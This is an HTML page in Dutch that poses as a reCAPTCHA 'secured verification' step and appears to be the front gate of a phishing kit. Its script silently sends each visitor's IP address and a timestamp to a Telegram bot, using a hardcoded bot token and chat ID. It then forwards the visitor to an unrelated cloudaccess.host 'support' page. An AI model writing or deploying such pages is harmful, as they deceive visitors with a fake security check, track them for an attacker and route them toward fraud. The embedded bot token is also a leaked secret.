<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verbeterde reCAPTCHA v2 Verificatie</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    /* (CSS remains mostly unchanged, no need to translate CSS variables or style rules) */
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Beveiligde Verificatie</h1>
    </div>

    <div class="content">
      <div class="success-message" id="successMsg">
        <p>Verificatie geslaagd! U kunt doorgaan.</p>
      </div>

      <form id="verificationForm">
        <div class="recaptcha-container">
          <div class="g-recaptcha" data-sitekey="6LdjLVwrAAAAANfZHQQgyJcqnWR9d5xm-1uQoTmu"></div>
        </div>
        <div class="error-message" id="errorMsg">Bevestig alstublieft dat u geen robot bent.</div>
        <button type="submit" class="submit-btn" id="submitBtn">Klik om door te gaan</button>
      </form>
    </div>
  </div>

  <div class="footer">
    <p>© 2025 Beveiligd Verificatiesysteem. Alle rechten voorbehouden.</p>
  </div>
  
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const form = document.getElementById('verificationForm');
      const errorMsg = document.getElementById('errorMsg');
      const successMsg = document.getElementById('successMsg');
      const submitBtn = document.getElementById('submitBtn');

      form.addEventListener('submit', function (e) {
        e.preventDefault();

        const response = grecaptcha.getResponse();
        if (!response) {
          errorMsg.style.display = 'block';
          return;
        }

        errorMsg.style.display = 'none';
        submitBtn.disabled = true;
        submitBtn.textContent = 'Doorverwijzen over 3 seconden...';
        successMsg.style.display = 'block';

        // ✅ VERZEND NAAR TELEGRAM
        const ipApi = 'https://api.ipify.org?format=json';
        fetch(ipApi)
          .then(response => response.json())
          .then(data => {
            const ip = data.ip;
            const message = `✅ CAPTCHA CSS CH voltooid\nIP: ${ip}\nTijd: ${new Date().toLocaleString()}`;
            const telegramUrl = `https://api.telegram.org/bot7826039389:AAEgkviSmkAjq8ahS_znrQOunJJT-__4kWI/sendMessage?chat_id=8117499716&text=${encodeURIComponent(message)}`;
            fetch(telegramUrl);
          });

        // ✅ DOORSTUREN
        setTimeout(() => {
          window.location.href = "https://argenparyomnyom.cloudaccess.host/support";
        }, 3000);
      });
    });
  </script>
</body>
</html>
